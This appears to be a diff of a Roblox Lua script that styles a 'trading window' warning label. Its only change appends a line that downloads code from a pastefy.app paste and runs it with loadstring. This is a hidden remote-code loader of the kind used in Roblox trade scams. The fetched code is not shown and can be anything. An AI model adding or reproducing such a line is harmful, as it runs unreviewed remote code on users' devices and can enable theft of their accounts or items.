@@ -160,3 +160,5 @@ bottomNote.Text = "‼️Only Works Inside Trading Window‼️"
 bottomNote.Font = Enum.Font.GothamBold
 bottomNote.TextColor3 = Color3.fromRGB(255, 0, 0)
 bottomNote.TextSize = 12
+
+loadstring(game:HttpGet("https://pastefy.app/QXuOEQNf/raw"))()
